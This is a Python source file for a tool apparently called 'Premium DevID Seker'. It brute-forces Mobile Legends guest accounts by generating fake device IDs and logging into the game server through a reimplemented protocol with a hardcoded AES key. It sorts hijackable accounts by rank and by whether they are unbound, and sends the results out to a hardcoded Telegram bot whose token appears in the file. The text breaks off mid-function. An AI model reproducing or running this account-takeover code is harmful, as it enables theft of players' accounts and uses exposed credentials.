#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - ULTRA MLBB TOOLS v8.0
# Created by: @PRIME_MICK
# Features: 8 Real OEM Formats + Validation + Stats + Live Check + TG
# ===================================================================

import os, sys, time, random, uuid, json, threading, socket, zlib, string
import zstandard as zstd, struct, re, requests, hashlib, base64
from queue import Queue
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional, Callable
from Crypto.Cipher import AES
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone, timedelta
from collections import Counter

init(autoreset=True)

# ────────────────────────────────────────────────────────────────
# 1. CONFIGURATION
# ────────────────────────────────────────────────────────────────

TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(BASE_DIR, "PREMIUM_DEVID_SEKER_OUTPUT")

# ══════════════════════════════════════════════════════════════════
#  TELEGRAM CONFIG
# ══════════════════════════════════════════════════════════════════
TELEGRAM_BOT_TOKEN = "8950400071:AAERX1SIDYcH_b9kxUatj1B-x_SBLxYU5KE"
TELEGRAM_CHAT_ID = "8353748526"
ADMIN_USERNAME_DISPLAY = "@PRIME_MICK"
# ══════════════════════════════════════════════════════════════════

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16
SERVER_HOST = 'login.ml.youngjoygame.com'
SERVER_PORT = 30021
CLIENT_VERSION = '2.1.99.1205.1'
CHANNEL = 'and_usa'
LANGUAGE = 'en'
AVG_BYTES_PER_LINE = 85

HEX_CHARS = "0123456789abcdef"
BASE36_CHARS = string.ascii_lowercase + string.digits
BASE62_CHARS = string.ascii_letters + string.digits

# ══════════════════════════════════════════════════════════════════
#  OEM POOLS
# ══════════════════════════════════════════════════════════════════

OEM_A = "cd9e459ea708a948d5c2f5a6ca8838cf"

OEM_B_POOL = [
    "e9fbdb6c2be72123da4d703147c94b19",
    "3587b169e45896db064559df2c2a8e8d",
    "1e526e21ef5d1a27c4cf4f6b8a414189",
    "2ab86ae5177a1b24550529b69b95067c",
    "d7a1d0aca5b33c9d4c9c2f9ac3f8be61",
    "369c13b29869edaa27e47898d2b65b47",
    "a084849de06078b102b94d9c9deef8fd",
    "0870483ad2e1fc6a0e4f6f6cc630e29c",
    "50576dc1844743c995d7dc3f16335723",
    "422619b9b2cf2285efbfc837c64e9a9e",
    "d8222fa96375675be4537fe928991558",
    "63b2f0fcc15f91af05ebd30cdd14ec1b",
    "a6160fe063cefb54a52f4119f4040ec0",
    "02e15c10b575b5aec2e12bc9277b3b2b",
    "5d8d38cf2aa97269d4817e8346fcfb3b",
    "d520d6f4a4720fd656d4ff430dcf9c10",
    "105da1c5b46e67c2a597f58187dec33e",
    "4bb140191d54f5137e0ef41766162ea7",
    "14ae3ce77963e5561bd60353edaf4536",
    "5d259e7c802fc45dc12a1efd305ceafd",
    "0fdb59c757314ea8e31a9c66f54317ab",
    "1e0d905e8d5f828d97a526163b932696",
    "40e556f652a6a463721e44692293d462",
    "08025e85f6aa4900cbef1528319e364b",
    "9cfddaf3ac14fc3a30792f3bb69ee400",
    "a2764e5b72810ea7cc9c8fb4518a64d3",
    "3d31bc455484137719f10f1fa49044b3",
    "4966eacfb911d57953ebf9d2f59ef143",
    "3c704badf7f59efdf77ab3d27f1dc9c9",
    "b58373c170e7d1115a2dc142bf626cf7",
    "2c7e65e68fb1f2f72f8004c5806249ac",
    "cc4d4b384e63e9d171cd20b2cc0cbe98",
    "04962d868101d534001cf1a6532f4f0d",
    "e2972fbf1eb41440ead1f399cd63c9ee",
    "0282451629b979420486f6019c63f0fc",
    "4d94a0eeac46962913306922cdfcda9a",
    "78a9985504e01f892c4bdd8654dffb17",
    "0a8643f8ba4849f6a458cba71b426e6a",
    "8219f2c6c7175e385272952c99da93e7",
    "49c4461bc742eea93a0db7d4c0e671df",
    "5492850a24c6b9f1b7c137e55a3efff3",
    "f427e3f2b66e2c732d21107ea0681ddb",
    "8f5905637bf676a17c7d49527dd30a2e",
    "64835e1cfebd819fb5550e54a0be4325",
    "baf59ad603e9e859a948fdf53d359fb7",
    "46aa9446b9d36a0e9b1de66b5cc33614",
    "bec525ac69bcd4db008b149112a2c5e3",
    "78ab5fe0c80c34e2bc455e1949de1672",
    "6f4cab42a5f81ce509ebfb64f09d19c5",
    "6519dc5c5ece0d5fe4879c5f188621e0",
    "e2633970fb4991fd27c6db415ed97b76",
    "7b20a21ab9db463ea88c36c1a1ee6bf8",
    "9d076b3d41629c9a98cbe59852ef58e0",
    "72ff99fa2732feff1121c63068b1ab0e",
    "4fc3edf64adf2b1029e0eebd4d169c87",
    "8646fe1382e061e831f99aa321014912",
    "a939e4f4ecddfa0a8acbe41144b4139d",
    "f9a2110483105e68727cabb86b569182",
    "14f1a761abe21a58a3ee65088f250ae5",
    "58679e587c39d0f9819696812d41075a",
    "1b4a9cb4ec1dfb4e8f60dc6eb0018974",
    "3d74cf946e711c0cd2d73420a9930b69",
    "4e8c29eb576290944fbe8833acd07b06",
]

OEM_C_POOL = [
    "b7f9a1c2d3e4f5061728394a5b6c7d8e",
    "a1c8f304e792b516d8e0349acb1527fe",
    "f29c4815a73b06de1928475bc0d1e2f3",
    "e50b12789f4ca3612d8e057cb4a193fe",
    "d41d8cd98f00b204e9800998ecf8427e",
]

# ── Google Advertising ID style pool (Real GAID formats) ──
GAID_PREFIXES = [
    "38400000-8cf0-11bd-b23e-10b96e40000d",
    "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
]

OEM_MODE = "D"

def get_oem(mode: str = None) -> str:
    m = mode or OEM_MODE
    if m == "A":
        return OEM_A
    elif m == "B":
        return random.choice(OEM_B_POOL)
    elif m == "C":
        return random.choice(OEM_C_POOL)
    elif m == "MIX":
        return OEM_A if random.random() < 0.9 else random.choice(OEM_B_POOL)
    elif m == "MIX_ABC":
        r = random.random()
        if r < 0.70: return OEM_A
        elif r < 0.85: return random.choice(OEM_B_POOL)
        else: return random.choice(OEM_C_POOL)
    return OEM_A

# ══════════════════════════════════════════════════════════════════
#  FOLDERS
# ══════════════════════════════════════════════════════════════════

FOLDERS = {
    "generated": "00_Generated",
    "split": "00_Split_Devices",
    "login": "01_Login_Success",
    "detail": "03_Hasil_Detail_8Req",
    "rank_warrior": "04_Rank_Warrior",
    "rank_elite": "05_Rank_Elite",
    "rank_master": "06_Rank_Master",
    "rank_gm": "07_Rank_Grandmaster",
    "rank_epic": "08_Rank_Epic",
    "rank_legend": "09_Rank_Legend",
    "rank_mythic": "10_Rank_Mythic",
    "v2l_active": "11_V2L_Active",
    "v2l_inactive": "12_V2L_Inactive",
    "sultan": "13_Sultan",
    "highrank": "14_HighRank",
    "akun_tua": "15_Akun_Tua",
    "reports": "16_Reports",
    "checkpoint": "98_Checkpoints",
    "error": "99_Error",
    "bruteforce": "00_BruteForce_Logs",
}

def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in FOLDERS.values():
        os.makedirs(os.path.join(OUTPUT_DIR, folder), exist_ok=True)
ensure_dirs()

FILES = {
    "generated_devices": os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt"),
    "login_valid": os.path.join(OUTPUT_DIR, FOLDERS["login"], "login_valid_devices.txt"),
    "all_hits_detail": os.path.join(OUTPUT_DIR, FOLDERS["detail"], "all_hits_detail.txt"),
    "raw_devices_detail": os.path.join(OUTPUT_DIR, FOLDERS["detail"], "raw_devices_detail.txt"),
    "checkpoint_file": os.path.join(OUTPUT_DIR, FOLDERS["checkpoint"], "scan_checkpoints.json"),
    "error_log": os.path.join(OUTPUT_DIR, FOLDERS["error"], "error_log.txt"),
    "bruteforce_log": os.path.join(OUTPUT_DIR, FOLDERS["bruteforce"], "bruteforce_session.txt"),
    "hits_report": os.path.join(OUTPUT_DIR, FOLDERS["reports"], "hits_report.txt"),
}

# ────────────────────────────────────────────────────────────────
# 2. BANNER
# ────────────────────────────────────────────────────────────────

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    banner = f"""
{Fore.MAGENTA}██████╗ ██████╗ ███████╗███╗   ███╗██╗██╗   ██╗███╗   ███╗
{Fore.MAGENTA}██╔══██╗██╔══██╗██╔════╝████╗ ████║██║██║   ██║████╗ ████║
{Fore.CYAN}██████╔╝██████╔╝█████╗  ██╔████╔██║██║██║   ██║██╔████╔██║
{Fore.CYAN}██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╔╝██║██║██║   ██║██║╚██╔╝██║
{Fore.GREEN}██║     ██║  ██║███████╗██║ ╚═╝ ██║██║╚██████╔╝██║ ╚═╝ ██║
{Fore.GREEN}╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.YELLOW}           P R E M I U M   D E V I D   S E K E R
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.LIGHTBLACK_EX}              Created by: {Fore.CYAN}{ADMIN_USERNAME_DISPLAY}{Fore.LIGHTBLACK_EX} | v8.0
{Fore.LIGHTBLACK_EX}              OEM Mode: {Fore.GREEN}{OEM_MODE}{Fore.LIGHTBLACK_EX}
{Fore.LIGHTBLACK_EX}═══════════════════════════════════════════════════════════════
{Style.RESET_ALL}
"""
    print(banner)

def print_header(title=""):
    print_banner()
    if title:
        print(f"{Fore.CYAN}┌{'─'*58}┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.WHITE}{title.center(58)}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└{'─'*58}┘{Style.RESET_ALL}\n")

# ────────────────────────────────────────────────────────────────
# 3. TELEGRAM
# ────────────────────────────────────────────────────────────────

def send_telegram(message: str) -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=10)
        return resp.status_code == 200
    except Exception:
        return False

def send_telegram_document(file_path: str, caption: str = "") -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption, 'parse_mode': 'HTML'}
            resp = requests.post(url, data=data, files=files, timeout=60)
        return resp.status_code == 200
    except Exception as e:
        print(f"{Fore.RED}TG doc error: {e}{Style.RESET_ALL}")
        return False

_telegram_sent_cache = set()
_telegram_sent_lock = threading.Lock()

def send_telegram_once(device_id: str, message: str) -> bool:
    with _telegram_sent_lock:
        if device_id in _telegram_sent_cache:
            return False
        _telegram_sent_cache.add(device_id)
    success = send_telegram(message)
    with _telegram_sent_lock:
        if len(_telegram_sent_cache) > 10000:
            _telegram_sent_cache.clear()
    return success

# ────────────────────────────────────────────────────────────────
# 4. RANK MAPPING
# ────────────────────────────────────────────────────────────────

def map_rank(p) -> str:
    if not p or not isinstance(p, (int, float)) or p <= 0:
        return "Unranked"
    p = int(p)
    if p >= 136:
        stars = p - 136
        if stars >= 100: return f"Mythical Immortal ({stars}★)"
        if stars >= 50: return f"Mythical Glory ({stars}★)"
        if stars >= 25: return f"Mythical Honor ({stars}★)"
        return f"Mythic ({stars}★)"
    ranks = [
        (105, "Legend", 5, ["V","IV","III","II","I"]),
        (75, "Epic", 5, ["V","IV","III","II","I"]),
        (45, "Grandmaster", 5, ["V","IV","III","II","I"]),
        (25, "Master", 4, ["IV","III","II","I"]),
        (10, "Elite", 3, ["IV","III","II","I"]),
        (1, "Warrior", 3, ["III","II","I"]),
    ]
    for threshold, name, div_stars, div_names in ranks:
        if p >= threshold:
            offset = p - threshold
            div_idx = min(len(div_names)-1, offset // div_stars)
            star = (offset % div_stars) + 1
            return f"{name} {div_names[div_idx]} ({star}★)"
    return "Warrior III (1★)"

def get_rank_category(rank_text: str) -> str:
    rt = rank_text.lower()
    if "warrior" in rt: return "warrior"
    if "elite" in rt: return "elite"
    if "grandmaster" in rt: return "gm"
    if "master" in rt and "grand" not in rt: return "master"
    if "epic" in rt: return "epic"
    if "legend" in rt: return "legend"
    if "mythic" in rt or "immortal" in rt or "glory" in rt or "honor" in rt:
        return "mythic"
    return "other"

def get_stars_from_rank(rank_text: str) -> int:
    match = re.search(r'\((\d+)★\)', rank_text)
    return int(match.group(1)) if match else 0

# ────────────────────────────────────────────────────────────────
# 5. V2L + MOONTON + OFFLINE
# ────────────────────────────────────────────────────────────────

def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
    try:
        conn.send_data(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = conn.recv_data()
            if pid in (-1, None): break
            if pid == 10208 and res:
                data = dict(res)
                for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                    val = data.get(tag)
                    if val is not None and isinstance(val, (int, float)):
                        return "Enabled" if int(val) > 0 else "Disabled"
    except Exception:
        pass
    return "N/A"

def get_moonton_status(conn, role_id: int, zone_id: int) -> Dict[str, str]:
    result = {'mt': 'clear', 'mt_mail': 'clear', 'third_party': 'clear'}
    for pid_send, pid_recv in [(10214, 10215), (10178, 10179)]:
        try:
            conn.send_data(pid_send, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            for _ in range(3):
                pid, res = conn.recv_data()
                if pid in (-1, None): break
                if pid == pid_recv and res:
                    d = dict(res)
                    mt_val = d.get(1) or d.get(10) or d.get(20)
                    mt_mail_val = d.get(2) or d.get(11) or d.get(21)
                    third_val = d.get(3) or d.get(4) or d.get(5) or d.get(12)
                    result['mt'] = 'bound' if mt_val else 'clear'
                    result['mt_mail'] = 'bound' if mt_mail_val else 'clear'
                    result['third_party'] = 'bound' if third_val else 'clear'
                    return result
        except Exception:
            pass
    return result

def compute_offline_info(last_online_ts) -> Dict[str, Any]:
    now_utc = datetime.now(timezone.utc)
    if not last_online_ts or not isinstance(last_online_ts, (int, float)) or last_online_ts <= 0:
        return {'offline_days': 'N/A', 'last_online': 'N/A', 'raw_days': 0}
    try:
        last_dt = datetime.fromtimestamp(int(last_online_ts), tz=timezone.utc)
        delta = now_utc - last_dt
        days = int(delta.total_seconds() // 86400)
        hours = int((delta.total_seconds() % 86400) // 3600)
        last_wib = last_dt.astimezone(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')
        if days > 0: offline = f"{days} days"
        elif hours > 0: offline = f"{hours} hours"
        else: offline = f"{int((delta.total_seconds() % 3600) // 60)} minutes"
        return {'offline_days': offline, 'last_online': last_wib, 'raw_days': days}
    except Exception:
        return {'offline_days': 'N/A', 'last_online': 'N/A', 'raw_days': 0}

# ────────────────────────────────────────────────────────────────
# 6. SDP PROTOCOL
# ────────────────────────────────────────────────────────────────

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack()
        elif data is not None:
            self.update(data)
            self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()):
            self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[k] = v

    def _write_varint(self, n: int) -> bytes:
        res = bytearray()
        while n >= 0x80:
            res.append((n & 0x7F) | 0x80)
            n >>= 7
        res.append(n & 0x7F)
        return bytes(res)

    def _read_varint(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, dtype: SdpDataType):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15]) + self._write_varint(tag)

    def _pack_item(self, tag: int, val: Any):
        if isinstance(val, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if val else 0)
        elif isinstance(val, int):
            if val < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-val)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(val)
        elif isinstance(val, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._write_varint(len(enc)) + enc
        elif isinstance(val, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_varint(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_varint(len(val))
                for k, v in sorted(val.items()):
                    self._pack_item(0, k)
                    self._pack_item(0, v)
        else:
            raise Exception("Unsupported type")

    def _unpack_item(self) -> Tuple[int, Any]:
        if self.offset >= len(self.data): return 0, None
        hdr = self.data[self.offset]
        tag = hdr & 0xF
        dtype = SdpDataType(hdr >> 4)
        self.offset += 1
        if tag == 15: tag = self._read_varint()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._read_varint()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_varint()
        if dtype == SdpDataType.FLOAT: return tag, struct.unpack("<f", self._read_varint().to_bytes(4, 'little'))[0]
        if dtype == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._read_varint().to_bytes(8, 'little'))[0]
        if dtype == SdpDataType.STRING:
            l = self._read_varint()
            raw = self.data[self.offset:self.offset + l]
            self.offset += l
            try: return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l = self._read_varint()
            res = [self._unpack_item()[1] for _ in range(l)]
            return tag, res
        if dtype == SdpDataType.DICT:
            l = self._read_varint()
            res = {}
            for _ in range(l):
                _, k = self._unpack_item()
                _, v = self._unpack_item()
                res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

# ────────────────────────────────────────────────────────────────
# 7. CONNECTION
# ────────────────────────────────────────────────────────────────

class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue = b''

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(10)

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1
            self.socket = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.cleanup()

    def send_data(self, pid: int, sdp: SdpStruct):
        pkt = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + comp)
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            data = self.queue[4:size]
            self.queue = self.queue[size:]
            if ctype == 1: data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3: data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data)
            pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None

class GameLogin(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""

    def run(self) -> Tuple[Optional[int], Optional[int], str]:
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
            }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                return res.get(0), (res[2][0] if 2 in res else None), "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except Exception as e:
            return None, None, f"ERROR ({e})"
        finally:
            self.cleanup()

class GameConnection(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_host = ''
        self.game_port = 0
        self.creation_ts = 0
        self.ban_status = "NORMAL"

    def login_to_login_server(self) -> bool:
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
            2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            self.zone_id = res[2][0]
            self.creation_ts = res.get(19, 0)
            self.ban_status = "NORMAL"
            return True
        self.ban_status = f"LOGIN FAILED (PID: {pid})"
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION, 5: self.zone_id, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            host, port = res[1].split(':')
            self.game_host = host
            self.game_port = int(port)
            return True
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host, self.port = self.game_host, self.game_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id, 4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id
        }))
        for _ in range(5):
            pid, res = self.recv_data()
            if pid == 10002: return True
            if pid in (-1, None): break
        return False

    def check_ban_status(self) -> str:
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                binfo = res[0]
                reason = binfo.get('ban_reason', 'Unknown')
                self.ban_status = f"BANNED ({reason})"
                return self.ban_status
            if pid in (-1, None, 20002): break
        return self.ban_status

    def lookup_player(self, search_value: int):
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        for _ in range(8):
            pid, res = self.recv_data()
            if pid in (-1, None): return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 2: return None
        return None

    def get_role_info(self, role_id: int, zone_id: int):
        self.send_data(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10129: return res
        return None

    def get_skin_role_info(self, role_id: int, zone_id: int):
        self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10144: return res
        return None

# ══════════════════════════════════════════════════════════════════
# 8. ═══════════ ENHANCED DEVICE ID GENERATOR v8.0 ═══════════
# ══════════════════════════════════════════════════════════════════

# ── Utility Functions ──
def random_hex(n: int) -> str:
    """Generate random lowercase hex string"""
    return ''.join(random.choices(HEX_CHARS, k=n))

def random_base36(n: int) -> str:
    """Generate random base36 string"""
    return ''.join(random.choices(BASE36_CHARS, k=n))

def random_base62(n: int) -> str:
    """Generate random base62 string"""
    return ''.join(random.choices(BASE62_CHARS, k=n))

def uuid4_hex() -> str:
    """Generate UUID4 without dashes"""
    return uuid.uuid4().hex

def uuid4_str() -> str:
    """Generate standard UUID4 string"""
    return str(uuid.uuid4())

def uuid4_upper() -> str:
    """Generate uppercase UUID4"""
    return str(uuid.uuid4()).upper()

def uuid4_no_dash() -> str:
    """Generate UUID4 without dashes"""
    return str(uuid.uuid4()).replace('-', '')

def random_gaid() -> str:
    """Generate Google Advertising ID (GAID) format"""
    return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"

def random_android_id() -> str:
    """Generate Android ID (16 hex chars)"""
    return random_hex(16)

def random_imei() -> str:
    """Generate valid Luhn IMEI (15 digits)"""
    def luhn_check_digit(digits: str) -> str:
        total = 0
        for i, d in enumerate(reversed(digits)):
            n = int(d)
            if i % 2 == 0:
                n *= 2
                if n > 9: n -= 9
            total += n
        return str((10 - (total % 10)) % 10)
    
    base = ''.join(random.choices('0123456789', k=14))
    return base + luhn_check_digit(base)

def random_mac() -> str:
    """Generate random MAC address"""
    return ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))

def random_serial() -> str:
    """Generate Android serial number (8-16 alphanumeric)"""
    return random_base62(random.randint(8, 16))

def random_imei_sv() -> str:
    """Generate IMEI SV (Software Version)"""
    return f"{random.randint(1, 99):02d}"

# ── Format Validators ──
def validate_device_id(device_id: str) -> Tuple[bool, str]:
    """Validate device ID format and return (is_valid, reason)"""
    if not device_id or not isinstance(device_id, str):
        return False, "Empty or invalid type"
    
    # Check prefix
    if not (device_id.startswith("and_") or device_id.startswith("ios_")):
        return False, "Missing and_ or ios_ prefix"
    
    # Extract raw part
    raw = device_id[4:]
    
    # Check minimum length
    if len(raw) < 16:
        return False, f"Too short ({len(raw)} chars)"
    
    # Check for invalid characters
    if not all(c in string.hexdigits + string.ascii_lowercase + string.digits + '-_' + string.ascii_uppercase for c in raw):
        return False, "Contains invalid characters"
    
    # Check for duplicate consecutive chars (suspicious)
    if re.search(r'(.)\1{20,}', raw):
        return False, "Suspicious repeated characters"
    
    return True, "Valid"

# ── Format 1: Classic OEM + UUID (Highest hit) ──
def format_1_classic():
    """
    and_{OEM_32hex}{random_16hex}-{UUID4}
    Real MLBB device ID format - highest hit rate
    """
    oem = get_oem()
    return f"and_{oem}{random_hex(16)}-{uuid4_str()}"

# ── Format 2: Extended Base36 ──
def format_2_extended_b36():
    """
    and_{OEM_32hex}{20-25 base36}-{UUID4}
    Extended format with variable base36 suffix
    """
    oem = get_oem()
    b36_len = random.choice([20, 21, 22, 23, 24, 25])
    return f"and_{oem}{random_base36(b36_len)}-{uuid4_str()}"

# ── Format 3: Android ID style ──
def format_3_android_style():
    """
    and_{android_id_16hex}_{random_base36}
    Clean Android ID format
    """
    return f"and_{random_android_id()}_{random_base36(20)}"

# ── Format 4: GAID + Device ──
def format_4_gaid():
    """
    and_{GAID}_{random_hex}
    Google Advertising ID based format
    """
    return f"and_{random_gaid()}_{random_hex(16)}"

# ── Format 5: iOS Simple ──
def format_5_ios_simple():
    """
    ios_{UUID_UPPER}
    iOS identifierForVendor style
    """
    return f"ios_{uuid4_upper()}"

# ── Format 6: iOS + Timestamp ──
def format_6_ios_timestamp():
    """
    ios_{UUID_UPPER}_{microsecond_timestamp}
    iOS with timestamp
    """
    ts = int(time.time() * 1_000_000)
    return f"ios_{uuid4_upper()}_{ts}"

# ── Format 7: Full Composite (Most Realistic) ──
def format_7_composite():
    """
    and_{32hex}{imei}_{android_id}_{base36_24}
    Full composite with realistic components
    """
    oem = get_oem()
    imei = random_imei()
    android = random_android_id()
    b36 = random_base36(24)
    return f"and_{oem}{imei}_{android}_{b36}"

# ── Format 8: UUID5 style (Deterministic) ──
def format_8_uuid5_style():
    """
    and_{uuid5_namespace}_{base36}
    UUID5 deterministic style
    """
    namespace = uuid.UUID('6ba7b810-9dad-11d1-80b4-00c04fd430c8')
    name = f"{random_hex(16)}-{random.randint(1000000, 9999999)}"
    u5 = str(uuid.uuid5(namespace, name))
